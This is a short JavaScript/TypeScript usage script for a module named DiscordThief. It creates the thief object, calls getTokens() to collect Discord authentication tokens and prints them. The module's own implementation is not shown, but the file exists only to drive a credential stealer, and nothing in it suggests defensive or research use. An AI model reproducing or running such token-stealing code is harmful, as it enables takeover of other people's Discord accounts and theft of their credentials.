import { DiscordThief } from '.'

async function main() {
    const thief = new DiscordThief()
    const tokens = await thief.getTokens()

    console.log(tokens)
}

main()
